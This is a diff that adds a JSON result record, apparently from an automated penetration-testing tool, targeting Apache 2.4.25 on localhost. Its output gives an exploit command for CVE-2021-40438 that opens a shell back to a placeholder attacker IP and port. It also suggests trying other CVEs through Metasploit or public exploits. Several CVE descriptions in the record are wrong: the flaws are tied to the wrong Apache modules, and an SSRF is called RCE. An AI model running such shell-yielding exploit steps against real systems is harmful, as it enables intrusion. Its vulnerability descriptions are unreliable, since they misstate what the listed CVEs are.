@@ -1,0 +1,14 @@
+{
+  "timestamp": "2026-04-12T07:40:33.705455",
+  "target": "localhost",
+  "vulnerability": "Apache 2.4.25 RCE via CVE-2021-40438 (mod_proxy_html)",
+  "tool": "manual",
+  "module": "CVE-2021-40438 mod_proxy_html SSRF/RCE exploit",
+  "result": {
+    "success": null,
+    "output": "[MANUAL TESTING REQUIRED]\n\nVulnerability: Apache 2.4.25 RCE via CVE-2021-40438 (mod_proxy_html)\nPort: 8081\n\nSteps:\npython3 /path/to/cve-2021-40438_exploit.py --target http://localhost:8081 --listen-ip <ATTACKER_IP> --listen-port <ATTACKER_PORT>\n\nExpected outcome: Remote Code Execution, yielding a system shell\n\nFallback: Investigate other high-CVSS CVEs for Apache 2.4.25 (e.g., CVE-2023-25690 mod_proxy_ajp, CVE-2021-44790 mod_proxy) with available Metasploit modules or public exploits.",
+    "tool": "manual",
+    "vulnerability": "Apache 2.4.25 RCE via CVE-2021-40438 (mod_proxy_html)",
+    "port": 8081
+  }
+}
